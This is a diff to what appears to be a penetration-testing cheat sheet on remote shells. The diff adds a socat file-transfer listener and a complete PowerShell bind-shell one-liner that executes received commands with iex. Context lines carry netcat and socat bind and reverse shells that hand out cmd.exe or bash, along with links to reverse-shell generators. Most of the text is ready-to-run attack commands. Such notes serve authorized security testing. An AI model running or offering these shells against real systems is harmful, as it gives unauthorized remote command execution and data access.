@@ -105,10 +105,10 @@ A breakdown the command below `-l` creates listener, `-p` listen port, `-n` skip
 nc -lvnp <IP> <PORT>
 ```
 ### Bind shell
-
 ```powershell
 nc -nlvp 4444 -e cmd.exe
 ```
+
 ### Remote Administration
 Alot of machines do not support -e option for obvious security reasons
 ```
@@ -198,7 +198,6 @@ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
 ```
 
 ### Bind Shells
-
 Start a bind listener
 ```bash
 socat TCP-L:<PORT> EXEC:"bash -li"
@@ -220,6 +219,11 @@ Fixing terminal size
 ```bash
 stty size
 stty -rows 48 -columns 120
+```
+
+### File transfers
+```bash
+socat TCP4-LISTEN:$PORT,fork file:$filename
 ```
 
 ### SPECIAL upload precompiled socat binary 
@@ -268,7 +272,6 @@ socat.exe OPENSSL:127.0.0.1:5678, verify=0 EXEC=’cmd.exe
 ```
 
 ## SSH
-
 Flags:
 ```bash
 -i      access with private key
@@ -288,7 +291,14 @@ systemctl enable ssh
 systemctl disable ssh
 ```
 
-## Remoting with Powershell
+## Powershell
+### Bind shell
+```powershell
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+```
+Then `nc -nv $IP $PORT` in...
+
+### Remoting with Powershell
 
 Generally you must be administrator to `Enable-PSRemoting`, and require configuration of TrustedHosts:  
 ```powershell
@@ -399,3 +409,4 @@ nc -lvnp 9090
 [revshells](https://www.revshells.com/).
 [highoncoffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 [windows php](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)
+[doc.Microsoft.../system.net.sockets.tcplistener](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcplistener?view=netframework-4.7.2)
